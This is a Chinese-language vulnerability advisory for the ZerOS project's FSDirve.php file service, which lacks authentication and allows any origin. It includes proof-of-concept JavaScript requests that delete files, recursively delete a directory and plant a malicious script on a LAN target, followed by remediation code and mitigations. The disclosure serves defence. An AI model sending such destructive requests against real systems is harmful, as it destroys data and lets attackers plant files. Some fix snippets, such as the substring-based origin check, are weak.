# CVS-ZEROS-008: FSDirve 未授权远程文件操作漏洞

**漏洞编号**: CVS-ZEROS-008  
**发现日期**: 2026-01-06  
**提交者**: Anixe  
**修复日期**: 待修复  
**严重程度**: 严重 (CVSS 9.1)  
**CWE分类**: CWE-284 (不恰当的访问控制), CWE-306 (关键功能缺少认证)  
**状态**: 待修复

---

## 漏洞概述

ZerOS 系统的文件系统驱动服务 (`FSDirve.php`) 缺少任何形式的身份验证或授权机制，允许同一局域网内的恶意系统通过直接构造 HTTP 请求执行文件删除、创建、修改等敏感操作。攻击者只需知道目标 ZerOS 系统的 IP 地址即可完全控制目标系统的文件系统。

## 漏洞描述

`system/service/FSDirve.php` 作为 ZerOS 的核心文件系统服务，处理所有文件操作请求（创建、读取、写入、删除、移动、复制等），但该服务：

1. **完全开放访问**：设置了 `Access-Control-Allow-Origin: *`，允许来自任何源的跨域请求
2. **无身份验证**：不检查请求来源、用户身份或任何认证令牌
3. **无授权检查**：不验证请求者是否有权限执行相应操作
4. **无IP限制**：不限制请求来源IP地址
5. **直接执行操作**：接收到请求后直接执行文件系统操作，无任何安全检查

## 技术细节

### 漏洞位置

**文件**: `system/service/FSDirve.php`  
**受影响操作**:
- `delete_file` - 删除文件（行号: 1025-1031）
- `delete_dir` - 删除目录（行号: 956-961）
- `delete_dir_recursive` - 递归删除目录（行号: 1103-1108）
- `create_file` - 创建文件（行号: 973-988）
- `write_file` - 写入文件（行号: 1001-1022）
- `move_file` - 移动文件（行号: 1044-1052）
- `copy_file` - 复制文件（行号: 1055-1063）
- `rename_file` - 重命名文件（行号: 1034-1041）
- 以及其他所有文件操作

### 漏洞代码分析

**文件头部（无认证）**:
```12:14:system/service/FSDirve.php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
```

**文件删除操作（无验证）**:
```1025:1031:system/service/FSDirve.php
case 'delete_file':
    $path = $_GET['path'] ?? '';
    $fileName = $_GET['fileName'] ?? '';
    if (empty($path) || empty($fileName)) {
        sendResponse(false, '缺少必要参数: path, fileName', null, 400);
    }
    deleteFile($path, $fileName);
    break;
```

**删除文件函数（直接执行）**:
```438:465:system/service/FSDirve.php
function deleteFile($path, $fileName) {
    $dirPath = getDirPath($path);
    if (!$dirPath) {
        sendResponse(false, '无效的路径格式', null, 400);
    }
    
    $filePath = $dirPath . '/' . $fileName;
    
    // 检查文件是否存在
    if (!file_exists($filePath)) {
        sendResponse(false, '文件不存在: ' . $fileName, null, 404);
    }
    
    // 检查是否为文件
    if (!is_file($filePath)) {
        sendResponse(false, '路径不是文件: ' . $fileName, null, 400);
    }
    
    // 删除文件
    if (unlink($filePath)) {
        sendResponse(true, '文件删除成功', [
            'path' => normalizePath($path) . '/' . $fileName,
            'fileName' => $fileName
        ]);
    } else {
        sendResponse(false, '文件删除失败', null, 500);
    }
}
```

### 攻击场景

**场景1: 恶意系统删除目标系统文件**

在同一局域网内，恶意系统可以通过以下方式删除目标 ZerOS 系统的文件：

```javascript
// 恶意系统上的攻击代码
const targetIP = '192.168.1.100'; // 目标 ZerOS 系统 IP
const targetPort = 8089; // 默认 PHP 端口

// 删除目标系统的文件
const deleteUrl = `http://${targetIP}:${targetPort}/system/service/FSDirve.php?action=delete_file&path=D:/application&fileName=important.js`;

fetch(deleteUrl, {
    method: 'GET',
    headers: {
        'Content-Type': 'application/json'
    }
})
.then(response => response.json())
.then(data => {
    console.log('文件删除成功:', data);
})
.catch(error => {
    console.error('攻击失败:', error);
});
```

**场景2: 批量删除系统文件**

```javascript
// 递归删除整个目录
const deleteDirUrl = `http://${targetIP}:${targetPort}/system/service/FSDirve.php?action=delete_dir_recursive&path=D:/application`;

fetch(deleteDirUrl)
.then(response => response.json())
.then(data => {
    console.log('目录删除成功:', data);
});
```

**场景3: 创建恶意文件**

```javascript
// 创建恶意文件
const createUrl = `http://${targetIP}:${targetPort}/system/service/FSDirve.php?action=create_file&path=D:/application&fileName=malicious.js&content=alert('Hacked!')`;

fetch(createUrl)
.then(response => response.json())
.then(data => {
    console.log('恶意文件创建成功:', data);
});
```

**场景4: 使用 CLI 程序发送恶意请求**

攻击者可以编写一个简单的 CLI 程序，利用 ZerOS 的网络功能向目标系统发送恶意请求：

```javascript
// 恶意 CLI 程序
const __init__ = async (pid, args) => {
    const targetIP = args[0] || '192.168.1.100';
    const action = args[1] || 'delete_file';
    const path = args[2] || 'D:/application';
    const fileName = args[3] || 'important.js';
    
    const url = `http://${targetIP}:8089/system/service/FSDirve.php?action=${action}&path=${path}&fileName=${fileName}`;
    
    try {
        const response = await fetch(url);
        const result = await response.json();
        console.log('攻击结果:', result);
    } catch (error) {
        console.error('攻击失败:', error);
    }
};
```

### 攻击前提条件

1. **网络可达性**：攻击者需要与目标 ZerOS 系统在同一局域网内，或能够访问目标系统的网络
2. **IP 地址信息**：攻击者需要知道目标 ZerOS 系统的 IP 地址和端口（默认 8089 或 8080）
3. **服务运行**：目标系统的 FSDirve 服务必须正在运行

### 攻击影响范围

- **文件删除**：可以删除任意文件，包括系统关键文件、应用程序、用户数据
- **文件创建**：可以创建任意文件，包括恶意脚本、后门程序
- **文件修改**：可以修改任意文件内容，破坏系统完整性
- **目录操作**：可以删除、创建、移动整个目录结构
- **系统破坏**：可能导致系统完全无法使用

## 影响评估

### 严重性分析

- **机密性影响**: 高 - 可以读取任意文件内容
- **完整性影响**: 高 - 可以修改、删除任意文件
- **可用性影响**: 高 - 可以删除系统关键文件导致系统不可用
- **攻击复杂度**: 低 - 攻击非常简单，只需构造 HTTP 请求
- **攻击向量**: 网络 - 通过局域网或互联网攻击
- **权限要求**: 无 - 不需要任何权限或认证

### CVSS 评分: 9.1 (严重)

- **攻击向量 (AV)**: Network (N)
- **攻击复杂度 (AC)**: Low (L)
- **权限要求 (PR)**: None (N)
- **用户交互 (UI)**: None (N)
- **范围 (S)**: Unchanged (U)
- **机密性影响 (C)**: High (H)
- **完整性影响 (I)**: High (H)
- **可用性影响 (A)**: High (H)

## 修复方案

### 1. 实施身份验证机制

**方案 A: 基于 Token 的认证**

在 FSDirve.php 中添加 Token 验证：

```php
// 验证请求 Token
function validateRequest() {
    $token = $_GET['token'] ?? $_SERVER['HTTP_X_AUTH_TOKEN'] ?? '';
    $expectedToken = getSystemToken(); // 从系统配置获取
    
    if (empty($token) || $token !== $expectedToken) {
        sendResponse(false, '未授权访问：无效的认证令牌', null, 401);
    }
}

// 在每个操作前调用
$action = $_GET['action'] ?? '';
if (!empty($action)) {
    validateRequest();
}
```

**方案 B: 基于 Session 的认证**

验证请求是否来自已登录的 ZerOS 会话。

### 2. 实施授权检查

集成 ZerOS 的权限管理系统，验证请求者是否有权限执行相应操作：

```php
function checkPermission($action, $path) {
    // 从请求中获取用户信息或 PID
    $pid = $_GET['pid'] ?? null;
    $userId = $_GET['userId'] ?? null;
    
    // 验证用户权限
    // 需要与 ZerOS 内核的 PermissionManager 集成
    // 或通过内部 API 验证权限
}
```

### 3. 限制请求来源

**方案 A: IP 白名单**

只允许来自 localhost 或特定 IP 的请求：

```php
function checkIPWhitelist() {
    $allowedIPs = ['127.0.0.1', '::1', 'localhost'];
    $clientIP = $_SERVER['REMOTE_ADDR'] ?? '';
    
    if (!in_array($clientIP, $allowedIPs)) {
        sendResponse(false, '未授权访问：IP 地址不在白名单中', null, 403);
    }
}
```

**方案 B: Origin 验证**

验证请求的 Origin 头，只允许来自同一域名的请求：

```php
function checkOrigin() {
    $allowedOrigin = $_SERVER['HTTP_HOST'] ?? '';
    $requestOrigin = $_SERVER['HTTP_ORIGIN'] ?? '';
    
    if ($requestOrigin && !str_contains($requestOrigin, $allowedOrigin)) {
        sendResponse(false, '未授权访问：Origin 验证失败', null, 403);
    }
    
    header('Access-Control-Allow-Origin: ' . $requestOrigin);
}
```

### 4. 添加请求签名

使用 HMAC 签名验证请求的完整性和来源：

```php
function validateSignature($action, $params) {
    $signature = $_GET['signature'] ?? '';
    $timestamp = $_GET['timestamp'] ?? '';
    
    // 验证时间戳（防止重放攻击）
    if (abs(time() - $timestamp) > 300) { // 5分钟有效期
        sendResponse(false, '请求已过期', null, 401);
    }
    
    // 计算签名
    $expectedSignature = hash_hmac('sha256', $action . $timestamp . json_encode($params), SECRET_KEY);
    
    if ($signature !== $expectedSignature) {
        sendResponse(false, '签名验证失败', null, 401);
    }
}
```

### 5. 实施操作审计

记录所有文件操作，包括操作者、时间、操作类型等：

```php
function auditLog($action, $path, $result) {
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'action' => $action,
        'path' => $path,
        'result' => $result,
        'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    
    // 写入审计日志
    file_put_contents('audit.log', json_encode($logEntry) . "\n", FILE_APPEND);
}
```

### 6. 移除危险的 CORS 设置

将 `Access-Control-Allow-Origin: *` 改为仅允许特定来源：

```php
// 修复前
header('Access-Control-Allow-Origin: *');

// 修复后
$allowedOrigin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (isAllowedOrigin($allowedOrigin)) {
    header('Access-Control-Allow-Origin: ' . $allowedOrigin);
} else {
    sendResponse(false, '未授权访问：Origin 不在允许列表中', null, 403);
}
```

## 临时缓解措施

在正式修复前，可以采取以下临时措施：

1. **防火墙规则**：配置防火墙，只允许 localhost 访问 FSDirve 服务端口
2. **反向代理**：使用反向代理（如 Nginx）添加 IP 白名单或基本认证
3. **网络隔离**：将 ZerOS 系统部署在隔离的网络环境中
4. **监控告警**：监控 FSDirve 服务的访问日志，发现异常请求立即告警

## 修复验证

修复后应验证以下内容：

✅ 来自未授权源的请求被拒绝  
✅ 缺少认证令牌的请求被拒绝  
✅ 无效签名的请求被拒绝  
✅ 来自非白名单 IP 的请求被拒绝  
✅ 所有文件操作都被正确记录到审计日志  
✅ 授权检查正确集成 ZerOS 权限系统  
✅ CORS 设置仅允许授权来源

## 相关文件

- `system/service/FSDirve.php` (主要漏洞文件)
- `kernel/SystemInformation.js` (服务 URL 构建)
- `kernel/process/processManager.js` (文件系统 API 调用)
- `kernel/fileSystem/nodeTree.js` (文件系统操作)
- `system/service/backend-java/src/main/java/cn/zeros/controller/FSDirveController.java` (SpringBoot 后端，可能也存在相同问题)

## 参考

- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP Top 10 - Broken Access Control](https://owasp.org/www-project-top-ten/)

---

**修复状态**: ⚠️ 待修复  
**优先级**: P0 - 立即修复（严重安全漏洞）

